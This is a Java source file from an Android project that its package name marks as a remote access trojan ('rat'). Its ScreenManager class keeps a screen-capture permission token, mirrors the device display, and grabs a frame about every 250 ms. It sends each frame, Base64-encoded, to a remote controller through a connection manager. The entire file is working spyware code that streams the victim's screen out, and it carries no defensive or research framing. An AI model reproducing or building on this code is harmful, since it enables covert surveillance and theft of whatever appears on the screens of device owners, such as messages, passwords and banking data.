package com.wexow.rat.managers;

import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import com.wexow.rat.core.ConnectionManager;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

public class ScreenManager {
    private static final String TAG = "ScreenManager";

    private static MediaProjection savedProjection;
    private static VirtualDisplay virtualDisplay;
    private static ImageReader imageReader;
    private static boolean isStreaming = false;
    private static int screenWidth, screenHeight, screenDensity;
    private static int origWidth, origHeight;
    private static long lastFrameTime = 0;

    public static void setProjection(MediaProjection projection) {
        savedProjection = projection;
        Log.e(TAG, "✅ Projection set");
    }

    public static void saveProjection(Context ctx, int resultCode, Intent data) {
        try {
            MediaProjectionManager mpm = (MediaProjectionManager) ctx
                    .getSystemService(Context.MEDIA_PROJECTION_SERVICE);

            savedProjection = mpm.getMediaProjection(resultCode, data);

            if (savedProjection != null) {
                Log.e(TAG, "✅ MediaProjection saved: " + savedProjection);

                savedProjection.registerCallback(new MediaProjection.Callback() {
                    @Override
                    public void onStop() {
                        Log.e(TAG, "⚠️ MediaProjection stopped");
                        savedProjection = null;
                    }
                }, new Handler(Looper.getMainLooper()));
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ saveProjection: " + e.getMessage(), e);
        }
    }

    public static boolean hasProjection() {
        return savedProjection != null;
    }

    public static void initProjection(Context ctx, int resultCode, Intent data) {
        saveProjection(ctx, resultCode, data);
    }

    public static void startStreaming(Context ctx) {
        if (isStreaming) {
            Log.e(TAG, "Already streaming");
            return;
        }

        if (savedProjection == null) {
            Log.e(TAG, "❌ No MediaProjection saved");
            return;
        }

        try {
            isStreaming = true;

            savedProjection.registerCallback(new MediaProjection.Callback() {
                @Override
                public void onStop() {
                    Log.e(TAG, "⚠️ MediaProjection stopped by system");
                    stop();
                }
            }, new Handler(Looper.getMainLooper()));

            Log.e(TAG, "✅ Callback registered");

            WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
            DisplayMetrics dm = new DisplayMetrics();
            wm.getDefaultDisplay().getRealMetrics(dm);

            origWidth = dm.widthPixels;
            origHeight = dm.heightPixels;
            screenWidth = origWidth / 2;
            screenHeight = origHeight / 2;
            screenDensity = dm.densityDpi;

            Log.e(TAG, "📐 Screen: " + origWidth + "x" + origHeight +
                    " → " + screenWidth + "x" + screenHeight);

            imageReader = ImageReader.newInstance(screenWidth, screenHeight,
                    PixelFormat.RGBA_8888, 2);

            virtualDisplay = savedProjection.createVirtualDisplay("ScreenCapture",
                    screenWidth, screenHeight, screenDensity,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    imageReader.getSurface(), null, null);

            imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                @Override
                public void onImageAvailable(ImageReader reader) {
                    if (!isStreaming)
                        return;

                    Image image = null;
                    try {
                        image = reader.acquireLatestImage();
                        if (image != null) {
                            processImage(image);
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Image error: " + e.getMessage());
                    } finally {
                        if (image != null)
                            image.close();
                    }
                }
            }, new Handler(Looper.getMainLooper()));

            Log.e(TAG, "✅ Streaming started");

        } catch (Exception e) {
            Log.e(TAG, "❌ startStreaming: " + e.getMessage(), e);
            stop();
        }
    }

    private static void processImage(Image image) {
        long currentTime = System.currentTimeMillis();
        if (currentTime - lastFrameTime < 250)
            return;
        lastFrameTime = currentTime;

        try {
            Image.Plane[] planes = image.getPlanes();
            ByteBuffer buffer = planes[0].getBuffer();
            int pixelStride = planes[0].getPixelStride();
            int rowStride = planes[0].getRowStride();
            int rowPadding = rowStride - pixelStride * screenWidth;

            Bitmap bitmap = Bitmap.createBitmap(
                    screenWidth + rowPadding / pixelStride,
                    screenHeight,
                    Bitmap.Config.ARGB_8888);
            bitmap.copyPixelsFromBuffer(buffer);

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 40, baos);
            byte[] bytes = baos.toByteArray();
            String base64 = Base64.encodeToString(bytes, Base64.DEFAULT);

            JSONObject jo = new JSONObject();
            jo.put("type", "screen_share");
            jo.put("image", base64);
            jo.put("width", origWidth);
            jo.put("height", origHeight);
            ConnectionManager.send(jo.toString());

            bitmap.recycle();
        } catch (Exception e) {
            Log.e(TAG, "processImage: " + e.getMessage());
        }
    }

    public static void stop() {
        isStreaming = false;
        try {
            if (virtualDisplay != null)
                virtualDisplay.release();
        } catch (Exception ignored) {
        }
        try {
            if (imageReader != null)
                imageReader.close();
        } catch (Exception ignored) {
        }
        virtualDisplay = null;
        imageReader = null;
    }

    public static void destroyProjection() {
        stop();
        try {
            if (savedProjection != null)
                savedProjection.stop();
        } catch (Exception ignored) {
        }
        savedProjection = null;
    }
}
